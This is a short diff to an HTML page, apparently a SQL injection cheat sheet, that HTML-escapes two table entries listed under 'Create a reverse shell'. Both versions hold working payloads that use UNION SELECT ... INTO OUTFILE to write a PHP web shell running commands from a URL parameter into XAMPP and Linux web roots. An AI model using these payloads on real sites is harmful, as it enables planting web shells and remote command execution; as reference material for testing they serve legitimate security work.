@@ -639,8 +639,8 @@ layout: default
             <tr>
                 <td>Create a reverse shell</td>
                 <td>
-                    <li>' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/cmd.php'  -- -</li>
-                        <li>' UNION SELECT (<?php echo exec($_GET["cmd"]);) INTO OUTFILE '/srv/http/cmd.php';-- -</li>
+                    <li>&#039; UNION SELECT (&quot;&lt;?php echo passthru($_GET[&#039;cmd&#039;]);&quot;) INTO OUTFILE &#039;C:/xampp/htdocs/cmd.php&#039;  -- -</li>
+                        <li>&#039; UNION SELECT (&lt;?php echo exec($_GET[&quot;cmd&quot;]);) INTO OUTFILE &#039;/srv/http/cmd.php&#039;;-- -</li>
                         </td>
                     </tr>
                 </table>
